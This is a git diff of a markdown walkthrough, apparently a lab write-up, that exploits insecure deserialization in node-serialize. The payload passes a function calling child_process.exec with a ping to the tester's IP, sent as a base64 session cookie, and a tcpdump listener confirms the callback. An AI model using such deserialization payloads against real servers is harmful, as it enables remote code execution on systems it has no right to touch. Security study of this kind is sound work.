@@ -99,7 +99,7 @@ We will use the same above but with ping
 ```js
 var y = {
  email : function(){
- require('child_process').exec('ping -c 1 10.49.171.98', function(error, stdout, stderr) { console.log(stdout) });
+ require('child_process').exec('ping -c 1 192.168.246.164', function(error, stdout, stderr) { console.log(stdout) });
  },
 }
 var serialize = require('node-serialize');
@@ -133,5 +133,15 @@ eyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe1xuIHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3Mn
 ```
 
 We are going to insert it as  a session cokkie and see what changes happens into the homepage after inserting the cookie and then refresing the page.
+
+Before it we will set up  a listener too with the command 
+
+```bash
+sudo tcpdump -i tun0 icmp
+```
+
+Now we can see in the homepage that after inserting that cookie we are getting
+
+![after](after.png)
 
 
